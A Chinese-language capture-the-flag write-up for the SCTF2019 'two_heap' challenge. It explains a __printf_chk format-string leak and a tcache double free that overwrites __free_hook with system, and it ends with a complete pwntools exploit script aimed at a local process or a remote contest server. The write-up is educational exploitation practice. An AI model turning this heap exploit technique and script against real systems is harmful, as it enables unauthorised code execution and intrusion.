---
title: two_heap
categories:
- SCTF2019
---
# SCTF2019 two_heap

## 前言

一个冷知识=半小时内解决一道题

## 程序逻辑

程序还是只有Malloc和Free。

main函数里有个printf的格式化字符串漏洞但是printf_chk似乎不能非连续地输入%x%nx这样。

![main](./3.jpg)

malloc的size被8对齐处理，之后放入node[0]，chunk_addr放入node[1]。size开始都被初始化为0x80，且每次malloc的size不能与已经malloc的相同(指8对齐后的size)。且这里检查了bss里有无stdout地址。malloc的数量最多为8个。

![malloc](./1.jpg)

![malloc2](./2.jpg)

free这里存在double free。

![free](./3.jpg)

## 漏洞利用

__printf_chk可以用"%a%2$a%3$a"泄露出栈地址，根据固定偏移算出libc地址。

分配一个size=0的chunk，double free再malloc一个size=0x10的chunk修改fd，malloc一个size=0x8的chunk，再malloc一个size=0x18的即可分配到free_hook，改成system，最后free一个"/bin/sh\x00"的块拿shell

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x4f2c5,0x4f322,0x10a38c,0xe569f,0xe5858,0xe585f,0xe5863,0x10a398]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def New(p,size,content):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('Input the size:')
    p.sendline(str(size))
    p.recvuntil('Input the note:\n')
    p.send(content)

def Delete(p,index):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('Input the index:\n')
    p.sendline(str(index))

def exp(p):
    #leak libc
    p.recvuntil('Welcome to SCTF:\n')

    p.sendline('%a%2$a%3$a')
    p.recvuntil('0x0.0')
    recv = '0x'+p.recvuntil('p',drop=True)+'0'
    print (recv)
    libc_base = int(recv,16) - 0x861a590
    log.success('libc base => ' + hex(libc_base))

    malloc_hook = libc_base + libc.symbols['__free_hook']
    shell_addr = libc_base + libc.symbols['system']
    #get shell
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('Input the size:')
    p.sendline('0')#0
    Delete(p,0)
    Delete(p,0)
    New(p,0x10,p64(malloc_hook)+'\n')#1
    New(p,0x8,'a\n')#2
    New(p,0x18,p64(shell_addr)+'\n')#3

    New(p,0x20,'/bin/sh\x00\n')#4
    gdb.attach(p)
    Delete(p,4)


    p.interactive()

if debug:
    p = process('./two_heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('47.104.89.129',10002)
    libc = ELF('./libc-2.26.so')

exp(p)
```
